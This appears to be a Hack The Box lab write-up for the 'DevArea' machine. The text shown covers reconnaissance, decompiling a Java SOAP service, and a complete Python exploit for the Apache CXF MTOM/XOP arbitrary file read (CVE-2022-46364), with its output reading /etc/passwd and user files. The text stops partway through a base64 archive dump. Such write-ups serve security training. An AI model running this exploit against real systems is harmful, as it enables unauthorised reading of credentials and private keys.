---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - FTP
  - Java
  - ReverseEngineering
  - CVE-2022-46364
  - ApacheCeltixXFire
  - CXF
  - MessageTransmissionOptimizationMechanism
  - MTOM
  - ServerSideRequestForgery
  - SSRF
  - CVE-2025-54123
  - hoverfly
  - InsecureMiddlewareImplementation
  - BrokenAuthentication
  - ExposedSecretKey
  - CommandInjection
---

![](images/DevArea.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumeration of Port 21/TCP](#Enumeration-of-Port-21TCP)
- [Reverse Engineering the .jar-File using jd-gui](#Reverse-Engineering-the-jar-File-using-jd-gui)
- [Enumeration of Port 8080/TCP](#Enumeration-of-Port-8080TCP)
- [CVE-2022-46364: Apache Celtix + XFire (CXF) Message Transmission Optimization Mechanism (MTOM) Server-Side Request Forgery (SSRF)](#CVE-2022-46364-Apache-CeltiX--Xfire-CXF-Message-Transmission-Optimization-Mechanism-MTOM-Server-Side-Request-Forgery-SSRF)
- [Enumeration of Port 8888/TCP](#Enumeration-of-Port-8888TCP)
- [Initial Access](#Initial-Access)
    - [CVE-2025-54123: Remote Code Execution (RCE) in hoverfly at /api/v2/hoverfly/middleware endpoint due to insecure Middleware Implementation](#CVE-2025-54123-Remote-Code-Execution-RCE-in-hoverfly-at-apiv2hoverflymiddleware-endpoint-due-to-insecure-Middleware-Implementation)
- [user.txt](#usertxt)
- [Enumeration (dev_ryan)](#Enumeration-dev_ryan)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Broken Authentication via exposed Secret Key in syswatch](#Broken-Authentication-via-exposed-Secret-Key-in-syswatch)
    - [OS Command Injection](#OS-Command-Injection)
- [root.txt](#roottxt)
- [Post Exploitation](#Post-Exploitation)

## Summary

The box starts with `FTP` on port `21/TCP`, `SSH` on port `22/TCP`, `HTTP` on port `80/TCP`, a `Jetty` web service on port `8080/TCP`, a proxy server on port `8500/TCP`, and a `Hoverfly Dashboard` on port `8888/TCP`. Anonymous `FTP` access reveals a `Java` archive `employee-service.jar` which, after reverse engineering with `jd-gui`, discloses a `SOAP`-based `EmployeeService` running on port `8080/TCP` powered by `Apache CXF`.

The service is vulnerable to `CVE-2022-46364`, a file read primitive through the `Message Transmission Optimization Mechanism` (`MTOM`)/`XML-binary Optimized Packaging` (`XOP`). By embedding an `<xop:Include href="file:///..."/>` reference inside a crafted `SOAP` multipart request, arbitrary files can be read from the filesystem. Leveraging this vulnerability the `hoverfly.service` unit file is retrieved, exposing credentials for the `Hoverfly` admin account.

`Hoverfly` running on port `8888/TCP` is vulnerable to `CVE-2025-54123`, a `Remote Code Execution` (`RCE`) vulnerability in the `/api/v2/hoverfly/middleware` endpoint caused by an insecure middleware implementation. Exploiting this vulnerability with a crafted `PUT` request yields a reverse shell as `dev_ryan`, providing `Initial Access` and retrieval of `user.txt`.

For `Privilege Escalation` to root enumeration reveals a world-readable `/etc/syswatch.env` file containing the `SYSWATCH_SECRET_KEY`. This key is used to forge a valid `Flask` session cookie with `flask-unsign`, granting authenticated access to the internal `SysWatch` web application on port `7777/TCP`. The `/service-status` endpoint passes user-controlled input to `systemctl` via `shell=True` with an insufficient server-side regex, allowing `OS Command Injection` by bypassing client-side validation. Chaining two `ln -sf` symlink payloads through the `syswatch.sh logs` command exposes both `user.txt` and `root.txt`.

## Reconnaissance

### Port Scanning

We began with our initial port scan using `Nmap`. The scan revealed several open services including `FTP` with anonymous login enabled, `SSH`, an `Apache` web server redirecting to `http://devarea.htb/`, a `Jetty` service on port `8080/TCP`, a `Golang` proxy server on port `8500/TCP`, and a `Hoverfly Dashboard` on port `8888/TCP`. We added `devarea.htb` to our `/etc/hosts` file accordingly.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.18.122
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 20:04 +0100
Nmap scan report for 10.129.18.122
Host is up (0.065s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.10
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Mar 2026 19:05:06 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Mar 2026 19:04:49 GMT
|     Content-Length: 64
|     This is a proxy server. Does not respond to non-proxy requests.
|   HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sat, 28 Mar 2026 19:04:50 GMT
|     Content-Length: 64
|_    This is a proxy server. Does not respond to non-proxy requests.
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Hoverfly Dashboard
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8500-TCP:V=7.98%I=7%D=3/28%Time=69C82651%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20
SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
SF:e-Options:\x20nosniff\r\nDate:\x20Sat,\x2028\x20Mar\x202026\x2019:04:49
SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(
SF:HTTPOptions,E9,"HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nDate:\x20Sat,\x2028\x20Mar\x202026\x2019:04:50\x20GMT\r\nCo
SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n")%r(RTSPRequest,6
SF:7,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%
SF:r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request")%r(FourOhFourRequest,E9,"HTTP/1\.0\x20500\x20In
SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Sat,\x2028\x20Mar
SF:\x202026\x2019:05:06\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
SF:x20requests\.\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.45 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.18.122   devarea.htb
```

### Enumeration of Port 80/TCP

Running `WhatWeb` against the web service confirmed an `Apache 2.4.58` installation serving the `DevArea` platform.

- [http://devarea.htb/](http://devarea.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://devarea.htb/
http://devarea.htb/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[10.129.18.122], Script, Title[DevArea - Connect with Top Development Talent]
```

The website presented a developer talent platform with no immediately obvious attack surface.

![](images/2026-03-28_20-10_80_website.png)

### Enumeration of Port 21/TCP

The `Nmap` scan had already indicated that anonymous `FTP` login was permitted. Connecting and listing the contents of the `pub` directory revealed a single `Java` archive.

```shell
┌──(kali㉿kali)-[~]
└─$ ftp 10.129.18.122
Connected to 10.129.18.122.
220 (vsFTPd 3.0.5)
Name (10.129.18.122:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

```shell
ftp> dir
229 Entering Extended Passive Mode (|||42628|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
```

```shell
ftp> cd pub
250 Directory successfully changed.
```

After navigating into the `pub` directory we found `employee-service.jar` and downloaded it for analysis.

```shell
ftp> ls
229 Entering Extended Passive Mode (|||47938|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
```

```shell
ftp> get employee-service.jar
local: employee-service.jar remote: employee-service.jar
229 Entering Extended Passive Mode (|||42275|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |******************************************************************************************************************************************************************************************************************|  6293 KiB    4.37 MiB/s    00:00 ETA226 Transfer complete.
6445030 bytes received in 00:01 (4.19 MiB/s)
```

## Reverse Engineering the .jar-File using jd-gui

Opening the archive in `jd-gui` revealed four relevant classes. The `EmployeeService` interface declared a single `submitReport` method accepting a `Report` object.

```java
package htb.devarea;  
  
import javax.jws.WebService;  
  
@WebService(name = "EmployeeService", targetNamespace = "http://devarea.htb/")  
public interface EmployeeService {  
  String submitReport(Report paramReport);  
}
```

![](images/2026-04-01_15-12_binary_employeeservice_class.png)

The `EmployeeServiceImpl` class showed the implementation, which simply reflected the submitted report fields back to the caller as a string.

```java
package htb.devarea;  
  
public class EmployeeServiceImpl implements EmployeeService {  
  public String submitReport(Report report) {  
    String greeting = report.isConfidential() ? ("Report marked confidential. Thank you, " + report.getEmployeeName()) : ("Report received from " + report.getEmployeeName());  
    return greeting + ". Department: " + report.getDepartment() + ". Content: " + report.getContent();  
  }  
}
```

![](images/2026-04-01_15-13_binary_employeeserviceimpl_class.png)

The `Report` class defined four fields: `employeeName`, `department`, `content`, and the boolean `confidential`.

```java
package htb.devarea;  
  
public class Report {  
  private String employeeName;  
    
  private String department;  
    
  private String content;  
    
  private boolean confidential;  
    
  public String getEmployeeName() {  
    return this.employeeName;  
  }  
    
  public void setEmployeeName(String employeeName) {  
    this.employeeName = employeeName;  
  }  
    
  public String getDepartment() {  
    return this.department;  
  }  
    
  public void setDepartment(String department) {  
    this.department = department;  
  }  
    
  public String getContent() {  
    return this.content;  
  }  
    
  public void setContent(String content) {  
    this.content = content;  
  }  
    
  public boolean isConfidential() {  
    return this.confidential;  
  }  
    
  public void setConfidential(boolean confidential) {  
    this.confidential = confidential;  
  }  
    
  public String toString() {  
    return "Report{employeeName='" + this.employeeName + '\'' + ", department='" + this.department + '\'' + ", content='" + this.content + '\'' + ", confidential=" + this.confidential + '}';  
  }  
}
```

![](images/2026-04-01_15-14_binary_report_class.png)

Most importantly, `ServerStarter` revealed that the service was running on port `8080/TCP` using `Apache CXF` via `JaxWsServerFactoryBean`, and that the `WSDL` was accessible at `/employeeservice?wsdl`.

```java
package htb.devarea;  
  
import org.apache.cxf.jaxws.JaxWsServerFactoryBean;  
  
public class ServerStarter {  
  public static void main(String[] args) {  
    JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();  
    factory.setServiceClass(EmployeeService.class);  
    factory.setServiceBean(new EmployeeServiceImpl());  
    factory.setAddress("http://0.0.0.0:8080/employeeservice");  
    factory.create();  
    System.out.println("Employee Service running at http://localhost:8080/employeeservice");  
    System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");  
  }  
}
```

![](images/2026-04-01_15-14_binary_server_starter_class.png)

## Enumeration of Port 8080/TCP

With the endpoint paths from the reverse engineering, browsing to the service confirmed it was live and responding to `SOAP` requests. Fetching the `WSDL` confirmed the `submitReport` operation and the `report` complex type matching what we saw in the source code.

- [http://devarea.htb:8080/employeeservice](http://devarea.htb:8080/employeeservice)
- [http://devarea.htb:8080/employeeservice?wsdl](http://devarea.htb:8080/employeeservice?wsdl)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://devarea.htb:8080/
http://devarea.htb:8080/ [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.27.v20200227)], IP[10.129.20.228], Jetty[9.4.27.v20200227], PoweredBy[Jetty://], Title[Error 404 Not Found]
```

```shell
┌──(kali㉿kali)-[~]
└─$ curl http://devarea.htb:8080/employeeservice
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><soap:Fault><faultcode>soap:Server</faultcode><faultstring>No binding operation info while invoking unknown method with params unknown.</faultstring></soap:Fault></soap:Body></soap:Envelope>
```

![](images/2026-04-01_14-37_8080_employeeservice_endpoint.png)

```shell
┌──(kali㉿kali)-[~]
└─$ curl http://devarea.htb:8080/employeeservice?wsdl
<?xml version='1.0' encoding='UTF-8'?><wsdl:definitions xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:tns="http://devarea.htb/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:ns1="http://schemas.xmlsoap.org/soap/http" name="EmployeeServiceService" targetNamespace="http://devarea.htb/">
  <wsdl:types>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://devarea.htb/" elementFormDefault="unqualified" targetNamespace="http://devarea.htb/" version="1.0">

  <xs:element name="submitReport" type="tns:submitReport"/>

  <xs:element name="submitReportResponse" type="tns:submitReportResponse"/>

  <xs:complexType name="submitReport">
    <xs:sequence>
      <xs:element minOccurs="0" name="arg0" type="tns:report"/>
    </xs:sequence>
  </xs:complexType>

  <xs:complexType name="report">
    <xs:sequence>
      <xs:element name="confidential" type="xs:boolean"/>
      <xs:element minOccurs="0" name="content" type="xs:string"/>
      <xs:element minOccurs="0" name="department" type="xs:string"/>
      <xs:element minOccurs="0" name="employeeName" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>

  <xs:complexType name="submitReportResponse">
    <xs:sequence>
      <xs:element minOccurs="0" name="return" type="xs:string"/>
    </xs:sequence>
  </xs:complexType>

</xs:schema>
  </wsdl:types>
  <wsdl:message name="submitReport">
    <wsdl:part element="tns:submitReport" name="parameters">
    </wsdl:part>
  </wsdl:message>
  <wsdl:message name="submitReportResponse">
    <wsdl:part element="tns:submitReportResponse" name="parameters">
    </wsdl:part>
  </wsdl:message>
  <wsdl:portType name="EmployeeService">
    <wsdl:operation name="submitReport">
      <wsdl:input message="tns:submitReport" name="submitReport">
    </wsdl:input>
      <wsdl:output message="tns:submitReportResponse" name="submitReportResponse">
    </wsdl:output>
    </wsdl:operation>
  </wsdl:portType>
  <wsdl:binding name="EmployeeServiceServiceSoapBinding" type="tns:EmployeeService">
    <soap:binding style="document" transport="http://schemas.xmlsoap.org/soap/http"/>
    <wsdl:operation name="submitReport">
      <soap:operation soapAction="" style="document"/>
      <wsdl:input name="submitReport">
        <soap:body use="literal"/>
      </wsdl:input>
      <wsdl:output name="submitReportResponse">
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
  </wsdl:binding>
  <wsdl:service name="EmployeeServiceService">
    <wsdl:port binding="tns:EmployeeServiceServiceSoapBinding" name="EmployeeServicePort">
      <soap:address location="http://devarea.htb:8080/employeeservice"/>
    </wsdl:port>
  </wsdl:service>
</wsdl:definitions>
```

## CVE-2022-46364: Apache Celtix + XFire (CXF) Message Transmission Optimization Mechanism (MTOM) Server-Side Request Forgery (SSRF)

Research into the `Apache CXF` version running on `Jetty 9.4.27.v20200227` revealed the service was vulnerable to `CVE-2022-46364`. While `Apache CXF` blocks inline `DTDs` and `XInclude` in `SOAP` body string fields, the `MTOM` interceptor resolves `<xop:Include href="file:///..."/>` references before `JAXB` unmarshalling. This makes the `content` field an arbitrary file-read primitive when the request is sent as `multipart/related` with the appropriate `MTOM` content type.

- [https://security.snyk.io/package/maven/org.eclipse.jetty%3Ajetty-xml/9.4.27.v20200227](https://security.snyk.io/package/maven/org.eclipse.jetty%3Ajetty-xml/9.4.27.v20200227)

We wrote a custom exploit script `lfi.py` implementing the `Message Transmission Optimization Mechanism` (`MTOM`)/`XML-binary Optimized Packaging` (`XOP`) technique to exfiltrate arbitrary files via the `EmployeeService` endpoint.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/files]
└─$ cat lfi.py 
#!/usr/bin/env python3
"""
SOAP XXE exploit for DevArea HTB – MTOM/XOP file read.

Apache CXF blocks inline DTDs and XInclude in string fields, but
the MTOM interceptor resolves <xop:Include href="file:///...">
BEFORE JAXB unmarshalling (CVE-2022-46364 / CVE-2024-28752 style).

Usage:
    python3 xxe_exploit.py -f /etc/passwd
    python3 xxe_exploit.py -f /etc/hosts -u http://devarea.htb:8080/employeeservice
"""

import argparse
import base64
import re
import sys
import uuid

import requests

ENDPOINT = "http://devarea.htb:8080/employeeservice"


def try_b64_decode(text: str) -> str:
    """If the text looks like base64, decode it; otherwise return as-is."""
    stripped = text.strip()
    if not stripped:
        return text
    clean = re.sub(r"\s+", "", stripped)
    if re.fullmatch(r"[A-Za-z0-9+/=]+", clean) and len(clean) >= 4:
        try:
            decoded = base64.b64decode(clean).decode("utf-8", errors="replace")
            printable = sum(c.isprintable() or c in "\n\r\t" for c in decoded) / max(len(decoded), 1)
            if printable > 0.8:
                return decoded
        except Exception:
            pass
    return text


def extract(raw: str) -> str:
    """Pull exfiltrated data from the SOAP response."""
    marker = ". Content: "
    idx = raw.find(marker)
    if idx != -1:
        end = raw.find("</return>", idx)
        if end != -1:
            return try_b64_decode(raw[idx + len(marker):end])
        return try_b64_decode(raw[idx + len(marker):])

    m = re.search(r"<[^>]*return[^>]*>(.*?)</[^>]*return>", raw, re.DOTALL)
    if m:
        return try_b64_decode(m.group(1))

    return ""


def exploit(target: str, filepath: str):
    boundary = f"uuid:{uuid.uuid4()}"
    start = "<root.message@cxf.apache.org>"

    soap_part = f"""<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:tns="http://devarea.htb/">
  <soap:Body>
    <tns:submitReport>
      <arg0>
        <confidential>false</confidential>
        <content><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file://{filepath}"/></content>
        <department>IT</department>
        <employeeName>test</employeeName>
      </arg0>
    </tns:submitReport>
  </soap:Body>
</soap:Envelope>"""

    body = (
        f"--{boundary}\r\n"
        f'Content-Type: application/xop+xml; charset=utf-8; type="text/xml"\r\n'
        f"Content-Transfer-Encoding: 8bit\r\n"
        f"Content-ID: {start}\r\n"
        f"\r\n"
        f"{soap_part}\r\n"
        f"--{boundary}--\r\n"
    )

    content_type = (
        f'multipart/related; boundary="{boundary}"; '
        f'type="application/xop+xml"; '
        f'start="{start}"; '
        f'start-info="text/xml"'
    )

    headers = {
        "Content-Type": content_type,
        "SOAPAction": '""',
    }

    print(f"[*] Target : {target}")
    print(f"[*] File   : {filepath}")
    print(f"[*] Sending MTOM/XOP payload …\n")

    try:
        resp = requests.post(target, data=body, headers=headers, timeout=10)
    except requests.exceptions.ConnectionError as e:
        sys.exit(f"[!] Connection failed: {e}")

    print(f"[*] HTTP {resp.status_code}")

    if "<soap:Fault>" in resp.text:
        fm = re.search(r"<faultstring>(.*?)</faultstring>", resp.text, re.DOTALL)
        fault = fm.group(1)[:200] if fm else "unknown"
        print(f"[-] SOAP Fault: {fault}")
        print(f"\n[!] Raw response:\n{resp.text}")
        return None

    contents = extract(resp.text)
    if contents:
        print(f"\n[+] Contents of {filepath}:\n")
        print(contents)
        return contents

    print(f"[?] Unexpected response:\n{resp.text[:500]}")
    return None


def main():
    parser = argparse.ArgumentParser(
        description="MTOM/XOP file-read exploit – DevArea EmployeeService (HTB)")
    parser.add_argument("-f", "--file", default="/home/dev_ryan/.ssh/id_ed52519",
                        help="Remote file to read (default: /etc/passwd)")
    parser.add_argument("-u", "--url", default=ENDPOINT,
                        help=f"SOAP endpoint URL (default: {ENDPOINT})")
    args = parser.parse_args()

    exploit(args.url, args.file)


if __name__ == "__main__":
    main()
```

Running the exploit confirmed arbitrary file read by successfully dumping `/etc/passwd`, which revealed the `dev_ryan` and `syswatch` user accounts among others.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/files]
└─$ python3 lfi.py
[*] Target : http://devarea.htb:8080/employeeservice
[*] File   : /etc/passwd
[*] Sending MTOM/XOP payload …

[*] HTTP 200

[+] Contents of /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:987::/var/log/laurel:/bin/false
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
```

| Username |
| -------- |
| dev_ryan |

Next we enumerated the home directory of `dev_ryan`, which revealed a `syswatch-v1.zip` archive alongside `user.txt`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/files]
└─$ python3 lfi.py -f /home/dev_ryan    
[*] Target : http://devarea.htb:8080/employeeservice
[*] File   : /home/dev_ryan
[*] Sending MTOM/XOP payload …

[*] HTTP 200

[+] Contents of /home/dev_ryan:

.bash_history
.bash_logout
.bashrc
.cache
.local
.profile
.ssh
syswatch-v1.zip
user.txt
```

We grabbed the file `syswatch-v1.zip` for further investigation. After we decoded the `Base64-blob` into an actual `.zip-file` we found a password inside `setup.sh` which we put into our notes for later use.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/files]
└─$ python3 lfi.py -f /home/dev_ryan/syswatch-v1.zip
[*] Target : http://devarea.htb:8080/employeeservice
[*] File   : /home/dev_ryan/syswatch-v1.zip
[*] Sending MTOM/XOP payload …

[*] HTTP 200

[+] Contents of /home/dev_ryan/syswatch-v1.zip:

UEsDBAoAAAAAALJEjlsAAAAAAAAAAAAAAAAJABwAc3lzd2F0Y2gvVVQJAAOfvT5poL0+aXV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAC0hIxbAAAAAAAAAAAAAAAADgAcAHN5c3dhdGNoL2xvZ3MvVVQJAAMjizxpMI09aXV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAC0hIxbAAAAAAAAAAAAAAAAFgAcAHN5c3dhdGNoL2xvZ3MvZGlzay5sb2dVVAkAAyOLPGmtjT1pdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAALSEjFsAAAAAAAAAAAAAAAAZABwAc3lzd2F0Y2gvbG9ncy9zZXJ2aWNlLmxvZ1VUCQADI4s8aa2NPWl1eAsAAQQAAAAABAAAAABQSwMECgAAAAAAtISMWwAAAAAAAAAAAAAAABwAHABzeXN3YXRjaC9sb2dzL2xvZy1hbGVydHMubG9nVVQJAAMjizxprY09aXV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAAC0hIxbAAAAAAAAAAAAAAAAGQAcAHN5c3dhdGNoL2xvZ3MvY3B1LW1lbS5sb2dVVAkAAyOLPGmtjT1pdXgLAAEEAAAAAAQAAAAAUEsDBAoAAAAAALSEjFsAAAAAAAAAAAAAAAAZABwAc3lzd2F0Y2gvbG9ncy9uZXR3b3JrLmxvZ1VUCQADI4s8aa2NPWl1eAsAAQQAAAAABAAAAABQSwMECgAAAAAAA1iNWwAAAAAAAAAAAAAAABYAHABzeXN3YXRjaC9zeXN3YXRjaF9ndWkvVVQJAAOGjT1ph409aXV4CwABBAAAAAAEAAAAAFBLAwQKAAAAAACrrIlbEUSaSQ0AAAANAAAAJgAcAHN5c3dhdGNoL3N5c3dhdGNoX2d1aS9yZXF1aXJlbWVudHMudHh0VVQJAAPi3DhprY09aXV4CwABBAAAAAAEAAAAAEZsYXNrPT0yLjMuMwpQSwMECgAAAAAArKyKWwAAAAAAAAAAAAAAACAAHABzeXN3YXRjaC9zeXN3YXRjaF9ndWkvdGVtcGxhdGVzL1VUCQADZC46aa2NPWl1eAsAAQQAAAAABAAAAABQSwMEFAAAAAgAN3uLW+zM8walBAAAswoAADMAHABzeXN3YXRjaC9zeXN3YXRjaF9ndWkvdGVtcGxhdGVzL3NlcnZpY2Vfc3RhdHVzLmh0bWxVVAkAA8ooO2mtjT1pdXgLAAEEAAAAAAQAAAAApVZtT+NGEP7Or1jcnmxLsXMUdGqT2AgOKiFxalWQqrZqq7U9sVdZ77q760Cay3/vrNdODAd8uPIB27Pz+swzs1kcX/308f63n69JZWqeHi2GB9AiPSL4tzDMcEg/VpCvyN1GG6jJHag1y4HcGWpavZg6FafOmVgRBTzxtNlw0BWA8UilYJl4U40GLJ92J3GutYehpi7WIpPFBh8FW5OcU60Tz8gmo8rrHY8OMkVF4aWYza/U5NViimdfarUaBuPuSDdUpNst0aA1kyIuwQS+